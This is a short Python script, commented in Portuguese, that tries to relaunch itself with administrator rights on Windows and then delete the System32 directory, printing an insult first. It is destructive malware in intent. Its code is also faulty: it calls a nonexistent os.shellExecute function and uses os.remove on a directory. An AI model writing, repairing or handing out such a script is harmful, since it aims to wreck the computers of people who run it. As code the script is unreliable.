import os
import sys

# Verifica se o script está executando com privilégios de administrador
if os.name == 'nt' and not os.environ.get('APP_RUNNING_AS_ADMIN'):
    # Reabre o programa com direitos de administrador
    try:
        # Isso lançará uma nova instância do script atual com direitos de administrador
        shell_args = ['/user:Administrator', sys.executable] + sys.argv
        os.environ['APP_RUNNING_AS_ADMIN'] = '1'
        os.shellExecute(None, 'runas', *shell_args)
    except Exception as e:
        print("Error: {}".format(e))
        input("Press Enter to continue...")
        sys.exit()

# Define o caminho do arquivo a ser excluído
file_path = 'C:\Windows\System32'

# Verifica se o arquivo existe
if os.path.exists(file_path):
    # Remove o arquivo com privilégios de administrador
    try:
        print('Good Bye idiot!')
        os.remove(file_path)
    except Exception as e:
        print("Error: {}".format(e))
else:
    print('File not found.')